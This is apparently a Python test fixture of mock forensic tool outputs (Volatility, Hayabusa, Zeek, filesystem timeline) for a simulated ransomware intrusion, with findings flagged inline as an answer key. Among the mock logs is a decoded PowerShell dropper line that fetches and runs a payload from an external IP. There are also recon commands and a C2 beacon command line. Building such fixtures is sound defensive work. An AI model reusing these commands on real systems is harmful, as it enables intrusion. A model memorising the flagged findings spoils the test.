"""
Realistic mock SIFT tool outputs for a ransomware attack scenario.

Timeline:
  T-72h  2024-11-15 09:20Z  Spearphishing email opened (Excel macro)
  T-71h  2024-11-15 09:23Z  PowerShell encoded dropper executes
  T-70h  2024-11-15 09:31Z  Scheduled task persistence created
  T-68h  2024-11-15 09:45Z  C2 beacon begins (45.77.23.108)
  T-48h  2024-11-15 10:05Z  Lateral movement to FILESERVER01
  T-6h   2024-11-17 03:55Z  156MB data exfiltrated via HTTPS
  T-0    2024-11-17 04:20Z  Ransomware deployed, files encrypted
"""

VOLATILITY_PSLIST = {
    "tool": "volatility_pslist",
    "profile": "Win10x64_19041",
    "processes": [
        {"pid": 4,    "ppid": 0,    "name": "System",      "cmdline": "", "create_time": "2024-11-15T08:00:00Z"},
        {"pid": 640,  "ppid": 4,    "name": "wininit.exe", "cmdline": "wininit.exe", "create_time": "2024-11-15T08:00:01Z"},
        {"pid": 684,  "ppid": 640,  "name": "lsass.exe",   "cmdline": "C:\\Windows\\system32\\lsass.exe", "create_time": "2024-11-15T08:00:02Z", "note": "Legitimate LSASS — correct parent wininit.exe"},
        {"pid": 880,  "ppid": 4,    "name": "explorer.exe","cmdline": "C:\\Windows\\explorer.exe", "create_time": "2024-11-15T08:05:00Z"},
        {"pid": 1256, "ppid": 880,  "name": "EXCEL.EXE",   "cmdline": "\"C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE\" \"C:\\Users\\jsmith\\Downloads\\Q3_Invoice_FINAL.xlsm\"", "create_time": "2024-11-15T09:20:44Z"},
        {"pid": 1420, "ppid": 1256, "name": "powershell.exe", "cmdline": "powershell.exe -NonInteractive -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==", "create_time": "2024-11-15T09:21:02Z", "flag": "SUSPICIOUS: spawned by Excel with encoded payload"},
        {"pid": 1680, "ppid": 1420, "name": "cmd.exe",      "cmdline": "cmd.exe /c whoami && net user && net group /domain", "create_time": "2024-11-15T09:22:15Z", "flag": "SUSPICIOUS: recon commands"},
        {"pid": 2840, "ppid": 1420, "name": "lsass.exe",   "cmdline": "C:\\Windows\\Temp\\lsass.exe -dump", "create_time": "2024-11-15T09:23:01Z", "flag": "CRITICAL ANOMALY: second lsass.exe running from C:\\Windows\\Temp\\ — almost certainly a credential dumping tool masquerading as LSASS"},
        {"pid": 3200, "ppid": 640,  "name": "svchost.exe", "cmdline": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "create_time": "2024-11-15T08:00:05Z"},
        {"pid": 4028, "ppid": 2840, "name": "updcheck.exe","cmdline": "C:\\Windows\\Temp\\updcheck.exe -beacon 45.77.23.108 -interval 300", "create_time": "2024-11-15T09:31:00Z", "flag": "CRITICAL: beacon process with hardcoded C2 IP"},
    ]
}

VOLATILITY_MALFIND = {
    "tool": "volatility_malfind",
    "injected_regions": [
        {
            "pid": 684,
            "process": "lsass.exe",
            "vad_start": "0x7ff000000000",
            "vad_end":   "0x7ff000010000",
            "protection": "PAGE_EXECUTE_READWRITE",
            "size_bytes": 65536,
            "hex_dump": "4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00",
            "disasm": ["0x7ff000000000: push rbp", "0x7ff000000001: mov rbp, rsp", "0x7ff000000004: sub rsp, 0x28"],
            "yara_matches": ["Mimikatz_signature", "PE_header_in_nonimage_vad"],
            "note": "MZ header (PE executable) detected inside lsass.exe non-image VAD with RWX permissions. Consistent with Mimikatz or similar credential dumper injected via reflective DLL loading."
        }
    ],
    "summary": "1 injected region found. High confidence credential dumping via process injection."
}

HAYABUSA_SCAN = {
    "tool": "hayabusa_scan",
    "alerts": [
        {
            "timestamp": "2024-11-15T09:21:02Z",
            "event_id": 4688,
            "rule": "Powershell Spawned By Office Application",
            "level": "high",
            "channel": "Security",
            "computer": "WORKSTATION01",
            "details": {
                "ParentImage": "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE",
                "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -NonInteractive -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...",
                "decoded_b64": "$client = New-Object System.Net.WebClient; $client.DownloadFile('http://45.77.23.108/stage2.dll', 'C:\\Windows\\Temp\\stage2.dll'); Start-Process C:\\Windows\\Temp\\lsass.exe"
            }
        },
        {
            "timestamp": "2024-11-15T09:22:15Z",
            "event_id": 4688,
            "rule": "Recon Commands Detected",
            "level": "medium",
            "channel": "Security",
            "computer": "WORKSTATION01",
            "details": {
                "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
                "CommandLine": "cmd.exe /c whoami && net user && net group /domain"
            }
        },
        {
            "timestamp": "2024-11-15T09:31:05Z",
            "event_id": 4698,
            "rule": "Scheduled Task Created",
            "level": "high",
            "channel": "Security",
            "computer": "WORKSTATION01",
            "details": {
                "TaskName": "\\Microsoft\\Windows\\UpdateCheck",
                "TaskContent": "<Actions><Exec><Command>C:\\Windows\\Temp\\updcheck.exe</Command><Arguments>-beacon 45.77.23.108 -interval 300</Arguments></Exec></Actions>",
                "SubjectUserName": "jsmith",
                "note": "Persistence via scheduled task using a fake Windows Update name"
            }
        },
        {
            "timestamp": "2024-11-15T10:05:22Z",
            "event_id": 4648,
            "rule": "Explicit Credential Use - Lateral Movement Indicator",
            "level": "high",
            "channel": "Security",
            "computer": "WORKSTATION01",
            "details": {
                "AccountName": "CORP\\fileserver-admin",
                "TargetServerName": "FILESERVER01",
                "TargetInfo": "\\\\FILESERVER01\\admin$",
                "note": "Admin credentials used to access file server admin share — classic lateral movement via pass-the-hash or stolen credentials"
            }
        },
        {
            "timestamp": "2024-11-17T03:14:59Z",
            "event_id": 4624,
            "rule": "Successful Network Logon to File Server",
            "level": "medium",
            "channel": "Security",
            "computer": "FILESERVER01",
            "details": {
                "AccountName": "CORP\\fileserver-admin",
                "LogonType": "3",
                "WorkstationName": "WORKSTATION01",
                "note": "Network logon type 3 — remote access"
            }
        }
    ],
    "summary": {
        "total_alerts": 5,
        "critical": 0,
        "high": 3,
        "medium": 2,
        "low": 0
    }
}

ZEEK_ANALYZE = {
    "tool": "zeek_analyze",
    "connections": [
        {"ts": "2024-11-15T09:21:03Z", "src_ip": "192.168.1.50", "dst_ip": "45.77.23.108", "dst_port": 80,  "proto": "tcp", "bytes_sent": 128,   "bytes_recv": 2048000, "duration": 3.1, "note": "Initial download of stage2.dll (2MB)"},
        {"ts": "2024-11-15T09:45:00Z", "src_ip": "192.168.1.50", "dst_ip": "45.77.23.108", "dst_port": 443, "proto": "tcp", "bytes_sent": 512,   "bytes_recv": 256,     "duration": 1.2, "note": "C2 beacon #1"},
        {"ts": "2024-11-15T09:50:00Z", "src_ip": "192.168.1.50", "dst_ip": "45.77.23.108", "dst_port": 443, "proto": "tcp", "bytes_sent": 512,   "bytes_recv": 256,     "duration": 1.1, "note": "C2 beacon #2 (5-min interval)"},
        {"ts": "2024-11-15T09:55:00Z", "src_ip": "192.168.1.50", "dst_ip": "45.77.23.108", "dst_port": 443, "proto": "tcp", "bytes_sent": 512,   "bytes_recv": 256,     "duration": 1.0, "note": "C2 beacon #3"},
        {"ts": "2024-11-17T03:55:12Z", "src_ip": "192.168.1.50", "dst_ip": "45.77.23.108", "dst_port": 443, "proto": "tcp", "bytes_sent": 156000000, "bytes_recv": 4096, "duration": 892.3, "note": "ANOMALY: 156MB outbound transfer — likely data exfiltration"},
    ],
    "dns_queries": [
        {"ts": "2024-11-15T09:20:45Z", "query": "cdn-updates.microsoft-live.com", "type": "A", "answer": "45.77.23.108", "ttl": 60, "note": "SUSPICIOUS: domain impersonates Microsoft, registered 2024-11-10, resolves to non-Microsoft hosting (Vultr VPS)"},
        {"ts": "2024-11-17T03:10:00Z", "query": "exfil.cdn-updates.microsoft-live.com", "type": "TXT", "answer": "ENCODED_DATA_CHUNK_001", "note": "SUSPICIOUS: TXT record queries consistent with DNS tunneling for data exfiltration — INCONCLUSIVE without deeper analysis"}
    ],
    "http_requests": [
        {"ts": "2024-11-15T09:21:03Z", "method": "GET", "host": "45.77.23.108", "uri": "/stage2.dll", "status": 200, "resp_body_len": 2048000}
    ],
    "summary": {
        "unique_external_ips": ["45.77.23.108"],
        "total_outbound_bytes": 156004096,
        "beaconing_detected": True,
        "beacon_interval_seconds": 300,
        "c2_ip": "45.77.23.108"
    }
}

FLS_TIMELINE = {
    "tool": "fls_timeline",
    "filesystem": "NTFS",
    "entries": [
        {"timestamp": "2024-11-15T09:21:04Z", "path": "C:/Windows/Temp/stage2.dll",   "action": "created",  "size_bytes": 2048000, "md5": "a3f8c2d1e9b047f6a2c8d3e1f0b9a7c5"},
        {"timestamp": "2024-11-15T09:22:58Z", "path": "C:/Windows/Temp/lsass.exe",    "action": "created",  "size_bytes": 1024512, "md5": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6", "note": "Mimikatz-variant dropped as lsass.exe — AV evasion by masquerading as system process"},
        {"timestamp": "2024-11-15T09:31:05Z", "path": "C:/Windows/Temp/updcheck.exe", "action": "created",  "size_bytes": 512288,  "md5": "c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9"},
        {"timestamp": "2024-11-17T03:50:00Z", "path": "C:/Windows/Temp/data_stage.zip","action": "created", "size_bytes": 156000000},
        {"timestamp": "2024-11-17T04:01:30Z", "path": "C:/Windows/Temp/data_stage.zip","action": "deleted", "size_bytes": 0,        "note": "Deleted after exfiltration — anti-forensic cleanup"},
        {"timestamp": "2024-11-17T04:20:00Z", "path": "C:/Users/jsmith/Desktop/README_DECRYPT.txt", "action": "created", "size_bytes": 2048},
        {"timestamp": "2024-11-17T04:20:05Z", "path": "C:/Users/jsmith/Documents/Q4_Report.docx.encrypted", "action": "modified", "note": "File encrypted by ransomware"},
        {"timestamp": "2024-11-17T04:20:06Z", "path": "C:/Users/jsmith/Documents/Passwords.xlsx.encrypted", "action": "modified"},
        {"timestamp": "2024-11-17T04:20:07Z", "path": "C:/Users/jsmith/Desktop/budget_2024.xlsx.encrypted", "action": "modified"},
    ],
    "summary": {
        "encrypted_files_count": 3,
        "ransom_notes_found": 1,
        "suspicious_executables": ["C:/Windows/Temp/lsass.exe", "C:/Windows/Temp/updcheck.exe", "C:/Windows/Temp/stage2.dll"],
        "temp_dir_abuse": True
    }
}

# Additional tools for self-correction
VOLATILITY_PSTREE = {
    "tool": "volatility_pstree",
    "note": "Shows parent-child process relationships — confirms process ancestry",
    "tree": [
        {"pid": 880, "name": "explorer.exe", "children": [
            {"pid": 1256, "name": "EXCEL.EXE", "children": [
                {"pid": 1420, "name": "powershell.exe", "children": [
                    {"pid": 1680, "name": "cmd.exe"},
                    {"pid": 2840, "name": "lsass.exe (FAKE)", "note": "CONFIRMED: spawned by powershell.exe — not a legitimate LSASS process. Real LSASS (PID 684) was spawned by wininit.exe."}
                ]}
            ]}
        ]}
    ],
    "lsass_validation": {
        "legitimate_lsass": {"pid": 684, "ppid": 640, "parent_name": "wininit.exe", "valid": True},
        "suspicious_lsass": {"pid": 2840, "ppid": 1420, "parent_name": "powershell.exe", "valid": False, "verdict": "CONFIRMED MALICIOUS — lsass.exe spawned by powershell.exe is impossible in normal Windows operation"}
    }
}

VOLATILITY_HANDLES = {
    "tool": "volatility_handles",
    "pid": 684,
    "process": "lsass.exe (legitimate)",
    "suspicious_handles": [
        {"handle_type": "Process", "target_pid": 2840, "target_name": "lsass.exe (fake)", "access": "PROCESS_ALL_ACCESS",
         "note": "Legitimate LSASS has a full-access handle to the fake lsass.exe — injection vector confirmed"}
    ]
}

DNS_WHOIS = {
    "tool": "dns_whois_lookup",
    "domain": "cdn-updates.microsoft-live.com",
    "registrar": "Namecheap",
    "registered": "2024-11-10",
    "registrant": "REDACTED (privacy protected)",
    "nameservers": ["ns1.bullethosting.io", "ns2.bullethosting.io"],
    "ip": "45.77.23.108",
    "ip_asn": "AS20473 - Vultr Holdings LLC",
    "ip_country": "Netherlands",
    "ip_abuse_reports": 3,
    "verdict": "Domain registered 5 days before attack, resolves to Vultr VPS with 3 prior abuse reports. NOT affiliated with Microsoft."
}

TOOL_OUTPUTS = {
    "volatility_pslist": VOLATILITY_PSLIST,
    "volatility_malfind": VOLATILITY_MALFIND,
    "hayabusa_scan": HAYABUSA_SCAN,
    "zeek_analyze": ZEEK_ANALYZE,
    "fls_timeline": FLS_TIMELINE,
    "volatility_pstree": VOLATILITY_PSTREE,
    "volatility_handles": VOLATILITY_HANDLES,
    "dns_whois_lookup": DNS_WHOIS,
    # Aliases for common requested tools
    "volatility_cmdline": VOLATILITY_PSLIST,
    "volatility_dlllist": VOLATILITY_MALFIND,
    "evtx_parse": HAYABUSA_SCAN,
    "zeek_dns": ZEEK_ANALYZE,
    "zeek_conn": ZEEK_ANALYZE,
    "suricata_alerts": {"tool": "suricata_alerts", "alerts": [
        {"ts": "2024-11-15T09:45:00Z", "sid": 2023476, "rule": "ET MALWARE Cobalt Strike Beacon", "src_ip": "192.168.1.50", "dst_ip": "45.77.23.108", "severity": "high"}
    ]},
    "autoruns_parse": FLS_TIMELINE,
    "istat": FLS_TIMELINE,
    "tsk_recover": FLS_TIMELINE,
}
